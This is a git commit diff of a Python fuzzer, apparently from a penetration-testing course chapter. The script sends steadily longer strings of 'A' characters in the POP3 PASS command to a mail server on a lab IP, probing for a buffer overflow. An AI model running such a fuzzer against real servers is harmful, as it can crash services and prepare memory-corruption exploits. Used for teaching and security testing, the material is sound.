bec2fce0b3895306a3885d90ddd29b97ce762513
root <root@localhost.localdomain>
2017-01-08 04:34:34 +0100

    added some updates

--- chapters/6/fuzz.py
+++ chapters/6/fuzz.py
@@ -3,32 +3,36 @@
 import socket
 import time
 
-MAIL_IP = '10.192.0.235'
+# Destination information #
+DEST_IP = '10.192.0.235'
+DEST_PORT = 110
 
-
+# VARIABLES #
 pw_buf = ["\x41"]
-counter = 300
+counter = 1300
 
-for x in range(1,30):
-	counter = counter+200
+# STATICS #
+STEP = 200
+BUF_LENGTH = 10
+
+
+for x in range(1,BUF_LENGTH):
+	counter = counter+STEP
 	pw_buf.append("\x41"*counter)
 
-#for pw in pw_buf:
-#	print("Length of pw is: %s" %len(pw))
+def send_data(socket, text):
+	socket.send(text.encode())
 
 for pw in pw_buf:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	print("Sending buffer with size: %s" %len(pw))
-	s.connect((MAIL_IP, 110))
+	s.connect((DEST_IP, DEST_PORT))
 	print (s.recv(1024))
 
-	s.send(('USER test' + '\r\n').encode())
-	print( s.recv(1024))
+	send_data(s, 'USER test' + '\r\n')
+	send_data(s, 'PASS ' + pw + '\r\n')
+	send_data(s, 'QUIT' + '\r\n')
 
-	s.send(('PASS' + pw + '\r\n').encode())
-	print (s.recv(1024))
-
-	s.send(('QUIT' + '\r\n').encode())
 	s.close()
 	print("All done\n")
 	
